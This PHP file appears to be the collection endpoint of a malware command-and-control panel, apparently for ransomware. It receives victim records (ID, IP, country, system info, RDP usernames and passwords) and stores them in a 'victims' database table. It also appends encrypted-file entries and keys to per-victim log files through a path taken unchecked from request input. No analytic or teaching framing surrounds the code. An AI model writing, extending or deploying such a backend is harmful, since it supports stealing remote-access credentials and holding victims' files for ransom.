<?php
#error_reporting(0);
include "../system/config.php";
include "../system/class_notice.php";
include "../system/class_pagination.php";
include "../system/function.php";
if(isset($_POST['id']) && 
  (isset($_POST['rdpuser'])) && 
  (isset($_POST['rdppass'])) && 
  (isset($_POST['info'])) && 
  (isset($_POST['ip'])) && 
  (isset($_POST['country'])) &&
  (isset($_POST['date']))){
		echo "Post Data Success";
		$sql = $db->go("INSERT INTO victims    (id, 
												vid,
												ip, 
												country, 
												info, 
												rdpuser, 
												rdppass, 
												date,
												status
												)
										VALUES (NULL, 
												'{$db->q($_POST['id'])}', 
												'{$db->q($_POST['ip'])}', 
												'{$db->q($_POST['country'])}', 
												'{$db->q($_POST['info'])}', 
												'{$db->q($_POST['rdpuser'])}', 
												'{$db->q($_POST['rdppass'])}', 
												'".date("Y-m-d")."',
												'0'
												)
						");

		if($sql) {
			echo "<br>Add to MySQL";
		}

  } elseif(isset($_POST['file']) && ($_POST['encfile'])){

  		$file = fopen("content/data/".$_POST['victim'].".log", "a");
  		fwrite($file, $_POST['file']."|".$_POST['encfile']."|".$_POST['key']."\n");
  		fclose($file);

  } else {
  	echo "No Post Data";
  }
